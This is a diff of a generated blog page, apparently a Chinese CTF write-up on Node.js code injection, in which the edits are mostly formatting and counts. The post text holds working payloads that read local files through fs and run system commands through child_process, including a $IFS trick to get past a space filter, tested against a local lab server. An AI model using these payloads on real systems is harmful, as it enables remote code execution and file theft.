@@ -27,7 +27,7 @@
     version: '7.5.0',
     exturl: false,
     sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
-    copycode: {"enable":false,"show_result":false,"style":null},
+    copycode: {"enable":true,"show_result":false,"style":"default"},
     back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
     bookmark: {"enable":false,"color":"#222","save":"auto"},
     fancybox: true,
@@ -274,7 +274,7 @@
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">字数统计:</span>
-           <span class="post-count">350(字)</span>
+           <span class="post-count">331(字)</span>
            
          </span>
 	  
@@ -315,9 +315,9 @@
 
 <h1 id="nodejs注入"><a href="#nodejs注入" class="headerlink" title="nodejs注入"></a>nodejs注入</h1><h2 id="执行JavaScript命令"><a href="#执行JavaScript命令" class="headerlink" title="执行JavaScript命令"></a>执行JavaScript命令</h2><p><code>payload: ?input=console.log(&#39;hello&#39;)</code></p>
 <p>运行rce.js，在浏览器中输入payload，可以看到控制台中输出了“hello”，说明我们的命令被成功执行了：<br>#</p>
-<h2 id="使用fs模块读取文件"><a href="#使用fs模块读取文件" class="headerlink" title="使用fs模块读取文件"></a>使用fs模块读取文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">rec.js目录下放置了一个flag.txt。</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">payload:?input&#x3D;res.end(require(&#39;fs&#39;).readFileSync(&#39;.&#x2F;flag.txt&#39;).toString())</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">浏览器窗口中输出了flag.txt的内容：</span></pre></td></tr></table></figure>
+<h2 id="使用fs模块读取文件"><a href="#使用fs模块读取文件" class="headerlink" title="使用fs模块读取文件"></a>使用fs模块读取文件</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">rec</span>.js目录下放置了一个flag.txt。</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">payload:?input=res.<span class="keyword">end</span>(require('fs').read<span class="constructor">FileSync('.<span class="operator">/</span><span class="params">flag</span>.<span class="params">txt</span>')</span>.<span class="keyword">to</span><span class="constructor">String()</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">浏览器窗口中输出了flag.txt的内容：</span></pre></td></tr></table></figure>
 <p>#</p>
-<h2 id="使用child-process模块执行系统命令"><a href="#使用child-process模块执行系统命令" class="headerlink" title="使用child_process模块执行系统命令"></a>使用child_process模块执行系统命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">payload:?input&#x3D;require(&#39;child_process&#39;).exec(&#39;calc&#39;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">成功弹出了计算器：</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">payload:http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;?input&#x3D;require(&#39;child_process&#39;).exec(&#39;mkdir test&#39;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">成功创建了一个名叫“test”的目录：</span></pre></td></tr></table></figure>
+<h2 id="使用child-process模块执行系统命令"><a href="#使用child-process模块执行系统命令" class="headerlink" title="使用child_process模块执行系统命令"></a>使用child_process模块执行系统命令</h2><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">payload:?<span class="built_in">input</span>=<span class="built_in">require</span>(<span class="string">'child_process'</span>).exec(<span class="string">'calc'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">成功弹出了计算器：</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">payload:http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8888</span>/?<span class="built_in">input</span>=<span class="built_in">require</span>(<span class="string">'child_process'</span>).exec(<span class="string">'mkdir test'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">成功创建了一个名叫“test”的目录：</span></pre></td></tr></table></figure>
 <h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>调用child_process模块执行命令，题目过滤了空格，用$IFS替代空格</p>
 <p>IFS，Linux叫做内部字段分隔符<br>#</p>
 <h3 id="模仿上面方法"><a href="#模仿上面方法" class="headerlink" title="模仿上面方法"></a>模仿上面方法</h3><p>payload:<br><code>/calc require(&quot;child_process&quot;).execSync(&quot;ls$IFS/&quot;).toString()</code></p>
@@ -404,14 +404,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">49</span>
+          <span class="site-state-item-count">50</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-count">11</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
